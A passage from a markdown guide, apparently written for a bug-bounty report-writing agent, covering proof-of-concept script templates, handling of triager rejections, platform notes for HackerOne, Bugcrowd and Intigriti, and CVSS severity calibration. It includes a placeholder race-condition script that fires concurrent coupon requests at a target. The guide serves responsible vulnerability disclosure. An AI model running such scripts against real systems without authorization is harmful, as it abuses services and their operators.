    except urllib.error.HTTPError as e:
        status = e.code
        try:
            body = json.loads(e.read())
        except Exception:
            body = {}

    print(f"Status:   {status}")
    print(f"Response: {json.dumps(body, indent=2)[:500]}")

    # Adjust condition to match the vulnerability indicator
    if status == 200 and "[indicator field]" in body:
        print("\n[!!!] VULNERABLE")
        sys.exit(0)
    else:
        print("\n[OK]  NOT VULNERABLE")
        sys.exit(1)

if __name__ == "__main__":
    check()
```

### Template C — Race Condition

```python
#!/usr/bin/env python3
"""
Reproduce: Race condition on [endpoint]
"""

import sys
import json
import threading
import urllib.request

BASE_URL  = "https://[target-domain]"
ENDPOINT  = "/api/[endpoint]"
THREADS   = 10  # concurrent requests — adjust
TOKEN     = "Bearer [token]"  # set your token here

results: list[tuple[int, dict]] = []
lock = threading.Lock()

def fire() -> None:
    req = urllib.request.Request(
        BASE_URL + ENDPOINT,
        data=json.dumps({"coupon": "SAVE20"}).encode(),
        headers={"Content-Type": "application/json", "Authorization": TOKEN},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req) as resp:
            body = json.loads(resp.read())
            with lock:
                results.append((resp.status, body))
    except Exception as e:
        with lock:
            results.append((0, {"error": str(e)}))

# Fire all threads simultaneously
threads = [threading.Thread(target=fire) for _ in range(THREADS)]
for t in threads:
    t.start()
for t in threads:
    t.join()

successes = [r for r in results if r[0] == 200 and r[1].get("success")]
print(f"Total requests: {THREADS}")
print(f"Successes:      {len(successes)}")
if len(successes) > 1:
    print(f"\n[!!!] VULNERABLE — {len(successes)} concurrent requests accepted")
    sys.exit(0)
else:
    print("\n[OK]  NOT VULNERABLE — only one request accepted")
    sys.exit(1)
```

---

## 8. Common Triager Rejection Patterns

### 8.1 "We cannot reproduce"

**Root causes and fixes**:

| Root cause | Fix |
|---|---|
| Static token embedded in report | Always use Step 0 auth — generate token dynamically |
| Missing prerequisite state | Add to Prerequisites: "Account B must have at least one completed order" |
| Region/plan-gated feature | State explicitly: "Requires Business plan" or "EU region only" |
| Timing-dependent (race condition) | State the thread count and tool used; provide reproduce.py with threading |
| Endpoint changed since submission | Test immediately before submitting; note submission timestamp |
| Wrong account type | Specify free vs paid vs admin vs verified |

**Pre-submission checklist**:
- [ ] Open a fresh browser/terminal (no cached state)
- [ ] Follow your own steps exactly, in order
- [ ] Capture the curl outputs during this fresh reproduction
- [ ] Submit within 2 hours of final reproduction

---

### 8.2 Missing Reproduction Step

**Most common omitted steps**:
- How to find the victim's resource ID (e.g., "view their profile URL")
- How to switch between accounts without logging out of the first
- How to trigger the vulnerable state (e.g., "complete checkout first")

**Fix**: Before submitting, give the report to a second person (or re-read it 24 hours
later as if you have never seen the target). Every step that requires implicit knowledge
is a step you forgot to write.

---

### 8.3 "Low severity" Dispute

If a program downgrades your severity, respond with:

1. **Re-anchor to CVSS** — provide the exact vector string with per-metric justification.
   If they disagree with a specific metric (e.g., PR:N vs PR:L), address that metric
   specifically with evidence.

2. **Quantify the impact** — "attacker reads 1 user's email" is Low; "attacker reads
   any of [N] users' email + phone + DOB without limit" is High. Show the scale.

3. **Add a chained scenario** — if the data can be used to escalate (e.g., exposed email
   enables targeted phishing that bypasses MFA), document the chain.

4. **Add regulatory angle** — if personal data is exposed, name the applicable regulation
   (GDPR, CCPA, Privacy Act 1988). Regulatory exposure increases business impact.

5. **Do NOT**: argue emotionally, threaten disclosure, or call the program out publicly.

---

### 8.4 "Duplicate"

**Before submitting**, run `DatabaseHooks.check_duplicate()`. If you still get marked
duplicate after submission:

- Ask for the duplicate report number (programs usually provide this)
- Read the duplicate — if your finding has a different endpoint, different parameter, or
  different impact chain, argue for a separate report
- If it is genuinely the same, accept the duplicate and move on — do not re-submit

**Partial duplicate** (your report adds new scope to an existing finding):
> "I note this may overlap with #XXXX. However, the present report demonstrates the
> vulnerability on endpoint `/api/v2/...` which was not covered in the earlier report,
> and achieves [higher/different] impact via [different mechanism]. I believe this warrants
> separate consideration."

---

### 8.5 "Informative / By Design"

This rejection means the program believes the behavior is intentional. Counter-strategies:

1. **Frame with attacker impact first** — "This design decision allows any attacker to
   [concrete harm]. The question is not whether it was intended, but whether the intent
   matches the risk."

2. **Point to the policy** — if the program's own security page or documentation says
   the feature is supposed to be protected, quote it.

3. **Show an alternative design** — "The intended behavior could be preserved while
   eliminating the risk by [one-sentence fix]. The current design was likely not
   evaluated for this attack scenario."

4. **For info disclosure** — programs often say internal URLs are not sensitive. Counter
   with a chain: "These URLs reveal [X], which enables [Y attack], resulting in [Z harm]."

5. **Accept gracefully if wrong** — if the program provides a clear technical reason the
   behavior is safe, update your methodology and move on.

---

## 9. Platform-Specific Notes

### 9.1 HackerOne

- **Markdown**: Full CommonMark support. Use headers (`##`), tables, code blocks,
  bold, italic. Images embedded with `![caption](url)` — upload files to HackerOne's
  attachment system, then use the returned URL.
- **CVSS**: Provide the full vector string. HackerOne has a built-in CVSS calculator.
  Link to your vector:
  `https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
- **Attachments**: Upload evidence files (screenshots, curl output, reproduce.py) as
  attachments. Reference them inline with the attachment ID link HackerOne provides.
- **Severity labels**: Critical (9.0-10.0), High (7.0-8.9), Medium (4.0-6.9), Low (0.1-3.9).
  HackerOne uses CVSS 3.1 base score as the primary severity driver.
- **"Needs More Info"**: HackerOne triagers have a 30-day SLA. If you get NMI, respond
  within 7 days or the report may be closed.
- **Private programs**: Do not disclose anything — company name, program scope, or finding
  details — until the program explicitly grants disclosure permission.

---

### 9.2 Bugcrowd

- **Markdown**: Supported, similar to GitHub Flavored Markdown.
- **CVSS**: Optional at submission time; Bugcrowd assigns their own P1-P5 priority based
  on their VRT (Vulnerability Rating Taxonomy). Include CVSS anyway — it helps your argument
  if they rate lower.
- **Severity labels**: P1 (Critical), P2 (High), P3 (Medium), P4 (Low), P5 (Informational).
  Note: Bugcrowd P labels do not map 1:1 to CVSS scores — VRT category matters more.
- **VRT alignment**: When possible, identify which VRT category your finding falls into
  and reference it: e.g., "VRT: Server-Side Injection > SQL Injection > Time Based".
- **Duplicate window**: Bugcrowd de-dupes against the last 6 months of reports for the
  same program. Check public program disclosures for prior similar findings.
- **Triage team**: Bugcrowd uses a centralised triage team (not the program's own team)
  for first-pass review. Write for a triager who does not know the target well.

---

### 9.3 Intigriti

- **Markdown**: Full support. Similar to HackerOne in behavior.
- **CVSS**: Supported and recommended. Intigriti uses CVSS 3.1.
- **Severity labels**: Critical, High, Medium, Low — driven by CVSS base score with
  program-specific adjustments.
- **Response time**: Intigriti SLA is typically 5 business days for initial response.
- **Collaboration**: Intigriti triagers often engage in back-and-forth before final ruling.
  Keep responses factual, fast, and concise.
- **Duplicate check**: Use Intigriti's "similar reports" panel visible during submission —
  it flags potential duplicates before you submit.

---

## 10. Severity Calibration

### 10.1 When to Claim S:Changed vs S:Unchanged

**Use S:C** when:
- XSS executes in victim's browser (different security domain from the server)
- SSRF reaches cloud metadata service, internal HTTP services, or DNS
- SSTI achieves OS-level code execution
- Subdomain takeover lets attacker's infrastructure respond on the target's origin
- XXE / SSRF reads files from the host OS (outside the application's data store)

**Use S:U** when:
- IDOR reads data within the same application and database
- SQLi reads or modifies the application's own database without lateral movement
- Business logic abuses the application's own features
- Auth bypass grants access to the same application's protected areas

**Wrong S:C claims will get downgraded by triagers** — the most common mistake is
claiming S:C for an IDOR that reads data within the same system.

---

### 10.2 When IDOR is High vs Critical

| Scenario | Typical Rating | Reasoning |
|---|---|---|
| Read any user's PII (email, phone, DOB) | High | C:H, I:N, S:U, PR:L → 6.5 Medium by CVSS but programs often rate High for PII data |
| Read + write any user's data | High | C:H, I:H, S:U |
| Read admin panel or secrets of any user | High | C:H |
| Account takeover via IDOR (write auth credentials) | Critical | C:H, I:H effectively enables full ATO |
| Mass enumeration with no rate limit | High → Critical if data is highly sensitive | Scale of impact elevates beyond CVSS base |
| Unauthenticated IDOR (no account needed) | +1 severity tier | PR:N changes 6.5 Medium to 7.5 High |

**Programs rarely rate IDOR as Critical unless**:
- It achieves direct account takeover (e.g., IDOR to change password/email)
- The exposed data includes payment card numbers, SSNs, or authentication secrets
- It is unauthenticated AND affects all users

---

### 10.3 When Info Disclosure is Medium vs Low

| Scenario | Rating | Reasoning |
|---|---|---|
| Internal hostnames / IP addresses in headers | Low | Minimal exploitability without further access |
| Stack traces / error messages with file paths | Low | Partial path information; no direct exploit |
| API keys / tokens with read-only access | Medium | C:L — partial access to a downstream service |
| Okta / OAuth client_id (no secret) | Low-Medium | By itself limited; enables targeted phishing |
| Okta / OAuth client_secret | Medium-High | Enables token forgery depending on flow |
| AWS IAM key material (any access) | High | Usable credential; real cloud access |
| Internal source code in JS bundle | Medium | C:H for logic exposure; depends on sensitivity |
| Database connection strings | High | Direct database access possible |
| PII of other users | High | Direct privacy impact on real people |
| Credentials enabling privilege escalation | Critical | Chain to ATO or system compromise |

**Framing tip**: Info disclosure almost always needs a chain to reach High. Show what an
attacker does WITH the disclosed information — "this OAuth client_id can be used in a
phishing page that looks identical to the real login, increasing credential theft rates".

---

### 10.4 When to Go Up in Severity

Increase your initial CVSS assessment when:
- **Mass exploitability**: A single script can affect all users, not just one victim —
  add "scale of impact" note in the Impact section; some programs manually elevate.
- **Chaining confirmed**: The finding chains with another vulnerability to achieve a
  higher-impact outcome — submit as a chain report at the chain's severity.
- **Sensitive asset**: The target is a financial, medical, or identity system — programs
  with high-value assets often apply environmental score multipliers.
- **No rate limiting**: Bulk enumeration possible — quantify: "at 10 req/s, all N user
  records retrievable in [X] minutes".

### 10.5 When to Go Down in Severity

Reduce your assessment when:
- **Requires social engineering beyond a click**: If exploitation requires the victim to
  install software or copy-paste a command, reduce UI:R and often reduce overall severity.
- **Requires privileged account to exploit**: If the attacker needs an admin or internal
  account (not a free/public account), use PR:H.
- **Impact is informational only**: If the disclosed data cannot be used to cause further
  harm (e.g., a non-functional legacy endpoint returning old data), use C:L.
- **Self-only exploitation**: If an attacker can only affect their own account, this is
  not a vulnerability in the traditional bug bounty sense.

---

*End of reporter-agent-full.md*
*Last updated: 2026-03-22*
*Stub location: `bountyhound-agent/agents/reporter-agent.md`*
